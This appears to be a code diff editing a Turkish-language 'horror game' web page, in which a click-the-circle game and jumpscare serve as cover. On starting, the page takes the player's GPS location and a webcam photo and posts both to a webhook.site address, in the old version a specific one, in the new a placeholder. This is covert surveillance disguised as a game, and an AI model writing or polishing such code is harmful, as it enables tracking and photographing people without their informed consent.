@@ -1,65 +1,48 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Korku Oyunu</title>
-<style>
-  html, body {
-    margin: 0; padding: 0;
-    background: #000;
-    color: #fff;
-    font-family: Arial, sans-serif;
-    height: 100vh;
-    overflow: hidden;
-  }
-  #permission-screen, #game-container, #jumpscare {
-    position: fixed;
-    top: 0; left: 0; width: 100%; height: 100%;
-    display: none;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    text-align: center;
-  }
-  #permission-screen { display: flex; }
-  button {
-    padding: 12px 24px;
-    font-size: 1.2rem;
-    background: crimson;
-    border: none;
-    color: white;
-    border-radius: 6px;
-    cursor: pointer;
-    margin-top: 20px;
-  }
-  #circle {
-    width: 80px;
-    height: 80px;
-    background: crimson;
-    border-radius: 50%;
-    position: absolute;
-    box-shadow: 0 0 15px red;
-    cursor: pointer;
-  }
-  #score-display {
-    position: absolute;
-    top: 20px;
-    left: 20px;
-    font-size: 1.5rem;
-  }
-  #goal {
-    position: absolute;
-    top: 20px;
-    right: 20px;
-    font-size: 1rem;
-    color: orange;
-  }
-  #jumpscare img {
-    width: 100%;
-    max-width: 600px;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Korku Oyunu</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0;
+      background: black; color: white;
+      font-family: Arial, sans-serif;
+      height: 100vh; overflow: hidden;
+    }
+    #permission-screen, #game-container, #jumpscare {
+      display: none;
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      justify-content: center; align-items: center;
+      flex-direction: column; text-align: center;
+    }
+    #permission-screen { display: flex; }
+    button {
+      background: crimson; color: white;
+      padding: 12px 24px; font-size: 1.2rem;
+      border: none; border-radius: 6px;
+      cursor: pointer; margin-top: 20px;
+    }
+    #circle {
+      width: 80px; height: 80px;
+      background: crimson; border-radius: 50%;
+      position: absolute; box-shadow: 0 0 15px red;
+      cursor: pointer;
+    }
+    #score-display {
+      position: absolute; top: 20px; left: 20px;
+      font-size: 1.5rem;
+    }
+    #goal {
+      position: absolute; top: 20px; right: 20px;
+      font-size: 1rem; color: orange;
+    }
+    #jumpscare img {
+      width: 100%; max-width: 600px;
+    }
+  </style>
 </head>
 <body>
 
@@ -77,7 +60,7 @@
 <div id="jumpscare">
   <img src="https://i.imgur.com/jxKX1U7.png" alt="Korkutucu yüz" />
   <audio id="scream" autoplay>
-    <source src="https://www.youtube.com/watch?v=Yc-CGFVb_EE" type="audio/mpeg" />
+    <source src="https://www.myinstants.com/media/sounds/horror-sound.mp3" type="audio/mpeg" />
   </audio>
 </div>
 
@@ -89,37 +72,39 @@ const circle = document.getElementById("circle");
 const scoreDisplay = document.getElementById("score-display");
 const jumpscare = document.getElementById("jumpscare");
 const scream = document.getElementById("scream");
-const webhookUrl = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34;
+const webhookUrl = "https://webhook.site/your-webhook-id"; // Değiştir
 
 let score = 0;
 
 startBtn.onclick = async () => {
   try {
     const location = await getLocation();
-    const photoBlob = await capturePhoto();
-    await sendToWebhook(location, photoBlob);
+    const photo = await takePhoto();
+    await sendData(location, photo);
+
     permissionScreen.style.display = "none";
     gameContainer.style.display = "block";
-    moveCircleRandom();
+    moveCircle();
   } catch (err) {
-    alert("İzinler alınamadı: " + err.message);
+    alert("İzin alınamadı: " + err.message);
   }
 };
 
-circle.addEventListener("click", () => {
+circle.onclick = () => {
   if(score >= 15) return;
   score++;
   scoreDisplay.textContent = "Skor: " + score;
-  moveCircleRandom();
+  moveCircle();
+
   if(score === 15) {
     gameContainer.style.display = "none";
     jumpscare.style.display = "flex";
     scream.play();
-    alert("Korktun mu? :)");
+    alert("Bitti... 😱");
   }
-});
+};
 
-function moveCircleRandom() {
+function moveCircle() {
   const maxX = window.innerWidth - 80;
   const maxY = window.innerHeight - 80;
   circle.style.left = Math.random() * maxX + "px";
@@ -128,7 +113,7 @@ function moveCircleRandom() {
 
 function getLocation() {
   return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) return reject(new Error("Tarayıcınız konumu desteklemiyor."));
+    if (!navigator.geolocation) return reject(new Error("Konum desteklenmiyor."));
     navigator.geolocation.getCurrentPosition(
       pos => resolve(pos.coords),
       err => reject(err),
@@ -137,7 +122,7 @@ function getLocation() {
   });
 }
 
-async function capturePhoto() {
+async function takePhoto() {
   const stream = await navigator.mediaDevices.getUserMedia({ video: true });
   const track = stream.getVideoTracks()[0];
   const imageCapture = new ImageCapture(track);
@@ -151,16 +136,15 @@ async function capturePhoto() {
   ctx.drawImage(bitmap, 0, 0);
 
   return new Promise(resolve => {
-    canvas.toBlob(resolve, "image/jpeg", 0.8);
+    canvas.toBlob(resolve, "image/jpeg", 0.9);
   });
 }
 
-async function sendToWebhook(coords, photoBlob) {
+async function sendData(coords, photoBlob) {
   const formData = new FormData();
   formData.append("latitude", coords.latitude);
   formData.append("longitude", coords.longitude);
-  formData.append("timestamp", new Date().toISOString());
-  formData.append("photo", photoBlob, "snapshot.jpg");
+  formData.append("photo", photoBlob, "photo.jpg");
 
   await fetch(webhookUrl, {
     method: "POST",
